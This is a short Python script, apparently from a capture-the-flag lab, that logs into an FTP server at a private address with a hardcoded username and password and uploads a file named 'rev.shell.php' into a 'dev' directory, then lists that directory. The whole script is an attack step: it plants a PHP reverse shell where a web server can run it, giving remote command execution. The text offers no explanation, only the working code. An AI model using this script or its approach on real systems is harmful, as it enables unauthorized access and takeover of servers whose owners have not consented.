
#!/usr/bin/python3
import ftplib

server = ftplib.FTP('10.10.10.197','developer','m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C')

with open('rev.shell.php','rb') as upload_file:
	server.storbinary('STOR dev/rev.shell.php', upload_file)

print(server.dir('dev'))
